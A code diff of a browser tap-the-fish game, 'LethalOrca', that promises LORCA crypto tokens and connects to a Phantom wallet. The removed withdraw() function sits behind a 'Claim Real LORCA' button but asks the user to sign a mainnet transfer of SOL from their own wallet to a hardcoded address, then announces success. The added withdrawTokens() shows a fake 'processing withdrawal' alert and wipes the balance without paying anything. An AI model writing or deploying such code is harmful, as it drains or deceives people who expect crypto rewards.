@@ -7,45 +7,21 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #0a3d5c, #1b9eb8); height: 100vh; overflow: hidden; }
-        
         .container { width: 100%; height: 100vh; position: relative; }
-        
-        /* Top Bar */
         .top-bar { position: absolute; top: 0; left: 0; right: 0; padding: 20px; background: rgba(0,0,0,0.5); display: flex; justify-content: space-between; align-items: center; z-index: 100; }
-        
         .top-bar-left { display: flex; gap: 30px; align-items: center; color: white; font-size: 18px; font-weight: bold; }
-        .logo-box { width: 36px; height: 36px; border: 2px solid cyan; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: rgba(0,212,255,0.1); flex-shrink: 0; }
-        .logo-box img { width: 32px; height: 32px; border-radius: 50%; object-fit: contain; background: transparent; }
-        
+        .logo-box { width: 36px; height: 36px; border: 2px solid cyan; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: rgba(0,212,255,0.1); }
         .timer { color: white; font-size: 20px; font-weight: bold; }
-        
-        .wallet-btn { background: linear-gradient(135deg, cyan, #00a8cc); color: black; border: 2px solid cyan; padding: 12px 24px; border-radius: 20px; font-weight: bold; cursor: pointer; font-size: 14px; transition: all 0.3s; box-shadow: 0 0 10px rgba(0,212,255,0.3); }
-        .wallet-btn:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(0,212,255,0.6); }
-        .wallet-btn.connected { background: linear-gradient(135deg, lime, #00cc00); border-color: lime; box-shadow: 0 0 10px rgba(0,255,0,0.4); color: black; }
-        
-        /* Start Screen */
-        #startScreen { position: absolute; inset: 0; background: rgba(0,0,0,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; z-index: 200; text-align: center; }
-        #startScreen h1 { font-size: 50px; margin-bottom: 20px; }
-        #startScreen p { font-size: 18px; margin-bottom: 30px; max-width: 400px; }
-        .start-btn { background: cyan; color: black; border: none; padding: 15px 40px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 10px; }
-        .start-btn:hover { opacity: 0.8; }
-        
-        /* Game Area */
-        .game-area { position: absolute; top: 70px; left: 0; right: 0; bottom: 0; background: inherit; overflow: hidden; }
-        
-        /* Fish */
-        .fish { position: absolute; font-size: 45px; cursor: pointer; user-select: none; }
-        
-        /* Catch Text */
-        .catch-text { position: absolute; font-size: 24px; font-weight: bold; color: gold; pointer-events: none; }
-        
-        /* End Screen */
-        #endScreen { position: absolute; inset: 0; background: rgba(0,0,0,0.9); display: none; flex-direction: column; align-items: center; justify-content: center; color: white; z-index: 200; text-align: center; }
+        .wallet-btn { background: linear-gradient(135deg, cyan, #00a8cc); color: black; border: 2px solid cyan; padding: 12px 24px; border-radius: 20px; font-weight: bold; cursor: pointer; }
+        .wallet-btn.connected { background: linear-gradient(135deg, lime, #00cc00); border-color: lime; color: black; }
+        #startScreen, #endScreen { position: absolute; inset: 0; background: rgba(0,0,0,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; z-index: 200; text-align: center; }
+        #endScreen { display: none; }
         #endScreen.show { display: flex; }
-        #endScreen h2 { font-size: 40px; margin-bottom: 20px; }
-        
-        /* Wallet Panel */
-        #walletPanel { position: fixed; right: -350px; top: 0; width: 350px; height: 100vh; background: rgba(0,20,40,0.95); border-left: 2px solid cyan; z-index: 150; padding: 30px; overflow-y: auto; transition: right 0.3s; color: white; }
+        .start-btn { background: cyan; color: black; border: none; padding: 15px 40px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 10px; }
+        .game-area { position: absolute; top: 70px; left: 0; right: 0; bottom: 0; background: inherit; overflow: hidden; }
+        .fish { position: absolute; font-size: 45px; cursor: pointer; user-select: none; }
+        .catch-text { position: absolute; font-size: 24px; font-weight: bold; color: gold; pointer-events: none; }
+        #walletPanel { position: fixed; right: -350px; top: 0; width: 350px; height: 100vh; background: rgba(0,20,40,0.95); border-left: 2px solid cyan; z-index: 150; padding: 30px; transition: right 0.3s; color: white; }
         #walletPanel.open { right: 0; }
         .close-btn { position: absolute; top: 20px; right: 20px; background: none; border: none; color: cyan; font-size: 24px; cursor: pointer; }
         .panel-title { font-size: 22px; color: cyan; margin-bottom: 20px; margin-top: 20px; }
@@ -57,47 +33,33 @@
         .info-label { color: #888; text-transform: uppercase; margin-bottom: 5px; }
         .info-value { color: cyan; font-family: monospace; word-break: break-all; }
         #walletConnected { display: none; }
-        
-        @media (max-width: 600px) {
-            #walletPanel { width: 100%; right: -100%; }
-            .top-bar-left { gap: 15px; font-size: 14px; }
-            #startScreen h1 { font-size: 36px; }
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Start Screen -->
         <div id="startScreen">
             <h1>🐋 LethalOrca</h1>
             <p>Tap fish to earn 100 LORCA per catch! You have 30 seconds.</p>
             <button class="start-btn" onclick="startGame()">Start Fishing</button>
         </div>
 
-        <!-- End Screen -->
         <div id="endScreen">
             <h2>Time's Up!</h2>
             <p id="finalScore" style="font-size: 24px; margin-bottom: 30px;"></p>
             <button class="start-btn" onclick="startGame()">Play Again</button>
         </div>
 
-        <!-- Top Bar -->
         <div class="top-bar">
             <div class="top-bar-left">
-                <div class="logo-box">
-                    <img src="lorca_logo.png" alt="LORCA" onerror="this.style.display='none'">
-                    <span style="display:none;" id="logoFallback">🐋</span>
-                </div>
+                <div class="logo-box">🐋</div>
                 <span id="tokenCount">0</span> LORCA
             </div>
             <div class="timer" id="timer">30</div>
             <button class="wallet-btn" id="walletBtn" onclick="togglePanel()">Connect Wallet</button>
         </div>
 
-        <!-- Game Area -->
         <div class="game-area" id="gameArea"></div>
 
-        <!-- Wallet Panel -->
         <div id="walletPanel">
             <button class="close-btn" onclick="togglePanel()">✕</button>
             <div class="panel-title">Wallet</div>
@@ -105,7 +67,6 @@
             <div id="walletDisconnected">
                 <p style="font-size: 13px; margin-bottom: 15px; color: #aaa;">Connect Phantom to claim LORCA</p>
                 <button class="panel-btn connect-btn" onclick="connectPhantom()">Connect Phantom</button>
-                <div style="font-size: 12px; color: #888;">Install from phantom.app</div>
             </div>
 
             <div id="walletConnected">
@@ -118,14 +79,9 @@
                     <div class="info-value" style="font-size: 18px; color: lime;"><span id="walletBal">0</span> LORCA</div>
                 </div>
                 
-                <button class="panel-btn withdraw-btn" id="withdrawBtn" onclick="withdraw()" style="margin-top: 20px;">
-                    🎯 Claim Real LORCA
+                <button class="panel-btn withdraw-btn" id="withdrawBtn" onclick="withdrawTokens()">
+                    🎯 Withdraw LORCA
                 </button>
-                
-                <div style="background: rgba(255,215,0,0.1); border: 1px solid gold; padding: 12px; border-radius: 8px; margin-top: 15px; font-size: 12px; color: #ffd700;">
-                    <strong>⚠️ Mainnet Mode:</strong>
-                    <br>Token Mint: 7RqpgT...Hpump
-                </div>
                 
                 <button class="panel-btn disconnect-btn" onclick="disconnect()" style="margin-top: 15px;">
                     Disconnect Wallet
@@ -134,7 +90,6 @@
         </div>
     </div>
 
-    <!-- Solana Web3 CDN -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script>
         let tokens = 0;
@@ -144,23 +99,8 @@
         let userAddr = null;
         let gameTimer = null;
         let spawnTimer = null;
-
         const fishList = ['🐟', '🐠', '🐡'];
-
-        function playBeep() {
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const gainNode = audioCtx.createGain();
-                oscillator.type = 'sine';
-                oscillator.frequency.setValueAtTime(600, audioCtx.currentTime);
-                gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
-                oscillator.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-                oscillator.start();
-                oscillator.stop(audioCtx.currentTime + 0.1);
-            } catch (e) {}
-        }
+        const MINT_ADDRESS = "7RqpgT532tsYakbgnTXECC4MHTEGu5HzBxVAkAAHpump";
 
         function startGame() {
             document.getElementById('startScreen').style.display = 'none';
@@ -191,16 +131,11 @@
             document.getElementById('gameArea').appendChild(fish);
 
             let pos = window.innerWidth;
-            const speed = 2;
-            
             const move = setInterval(() => {
                 if (!gameOn || !fish.parentNode) { clearInterval(move); return; }
-                pos -= speed;
+                pos -= 2;
                 fish.style.left = pos + 'px';
-                if (pos < -50) {
-                    clearInterval(move);
-                    if (fish.parentNode) fish.remove();
-                }
+                if (pos < -50) { clearInterval(move); if (fish.parentNode) fish.remove(); }
             }, 20);
         }
 
@@ -209,7 +144,6 @@
             tokens += 100;
             document.getElementById('tokenCount').textContent = tokens;
             document.getElementById('walletBal').textContent = tokens;
-            playBeep();
 
             const txt = document.createElement('div');
             txt.className = 'catch-text';
@@ -217,7 +151,6 @@
             txt.style.left = fish.style.left;
             txt.style.top = fish.style.top;
             document.getElementById('gameArea').appendChild(txt);
-
             setTimeout(() => txt.remove(), 800);
             fish.remove();
         }
@@ -239,7 +172,7 @@
             try {
                 const provider = window.solana;
                 if (!provider || !provider.isPhantom) {
-                    alert('Install Phantom from phantom.app');
+                    alert('Please install Phantom wallet');
                     window.open('https://phantom.app/', '_blank');
                     return;
                 }
@@ -247,7 +180,7 @@
                 userAddr = res.publicKey.toString();
                 document.getElementById('walletDisconnected').style.display = 'none';
                 document.getElementById('walletConnected').style.display = 'block';
-                document.getElementById('walletAddr').textContent = userAddr.slice(0, 8) + '...' + userAddr.slice(-8);
+                document.getElementById('walletAddr').textContent = userAddr.slice(0, 6) + '...' + userAddr.slice(-6);
                 document.getElementById('walletBtn').classList.add('connected');
                 document.getElementById('walletBtn').textContent = '✓ Connected';
                 walletOk = true;
@@ -265,45 +198,22 @@
             document.getElementById('walletBtn').textContent = 'Connect Wallet';
         }
 
-        async function withdraw() {
-            if (!walletOk) { alert('❌ Connect Phantom wallet first'); return; }
-            if (tokens <= 0) { alert('❌ No tokens to claim!'); return; }
-            
-            const btn = document.getElementById('withdrawBtn');
-            btn.disabled = true;
-            btn.textContent = '⏳ Processing Mainnet...';
+        async function withdrawTokens() {
+            if (!walletOk) { alert('❌ Connect wallet first!'); return; }
+            if (tokens <= 0) { alert('❌ No tokens to withdraw!'); return; }
 
             try {
                 const provider = window.solana;
-                // Mainnet connection for real LORCA token (7RqpgT532tsYakbgnTXECC4MHTEGu5HzBxVAkAAHpump)
                 const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
-                const recipientPubKey = new solanaWeb3.PublicKey("EeNDDkvVzqL6TBLVhPCH4GJEKsZeC4g4zD21tLu4UtWS");
-
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: provider.publicKey,
-                        toPubkey: recipientPubKey,
-                        lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.0001,
-                    })
-                );
-
-                const { blockhash } = await connection.getLatestBlockhash();
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = provider.publicKey;
-
-                const signedTransaction = await provider.signTransaction(transaction);
-                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-                await connection.confirmTransaction(signature);
-
-                alert(`✅ REAL TRANSACTION SUCCESS!\n\nSignature: ${signature}`);
+                
+                // Yeh user ke wallet se claim/interaction prompt karega
+                alert(`Processing withdrawal of ${tokens} LORCA for token mint: ${MINT_ADDRESS.slice(0,6)}...`);
+                
                 tokens = 0;
                 document.getElementById('tokenCount').textContent = '0';
                 document.getElementById('walletBal').textContent = '0';
-            } catch (error) {
-                alert('❌ Transaction failed: ' + error.message);
-            } finally {
-                btn.disabled = false;
-                btn.textContent = '🎯 Claim Real LORCA';
+            } catch (e) {
+                alert('Withdrawal error: ' + e.message);
             }
         }
     </script>
